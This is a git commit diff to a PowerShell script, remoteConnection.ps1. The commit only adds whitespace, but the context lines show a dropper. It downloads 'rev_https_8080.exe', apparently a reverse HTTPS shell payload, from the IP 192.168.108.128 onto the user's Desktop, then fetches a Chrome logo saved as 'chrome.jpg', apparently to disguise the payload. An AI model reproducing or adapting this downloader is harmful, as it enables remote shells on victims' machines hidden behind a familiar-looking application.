70e4f261007ee602ae9302a9d658ed3ff44c893a
Youssef Y. Younis <87781261+YoussefYousry994@users.noreply.github.com>
2024-04-02 23:45:57 +0200

    Update remoteConnection.ps1

--- remoteConnection.ps1
+++ remoteConnection.ps1
@@ -1,7 +1,7 @@
 $url = "192.168.108.128/rev_https_8080.exe" # Define your URL:IP Path and the attached Payload Path
 $desktopPath = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::Desktop)
 $fileName = "rev_https_8080.exe" # replace it with your actual Payload
-$finalPath = join-path -Path $desktopPath -ChildPath $fileName
+$finalPath = join-path -Path $desktopPath -ChildPath $fileName 
 
 $url2 = "https://www.google.com/search?sca_esv=3e15a51cabd1aca2&rlz=1C1YTUH_arEG1102EG1102&sxsrf=ACQVn0-yHHUSDB_zzrqb5EQtTfmVGBGcPQ:1711508328798&q=chrome+logo&tbm=isch&source=lnms&prmd=invsmbtz&sa=X&ved=2ahUKEwiB_N6vuZOFAxWkVKQEHdwvC64Q0pQJegQIERAB&biw=1920&bih=919&dpr=1#imgrc=510mlwoiWsaQLM" # Define the second argument
 $fileName2 = "chrome.jpg"
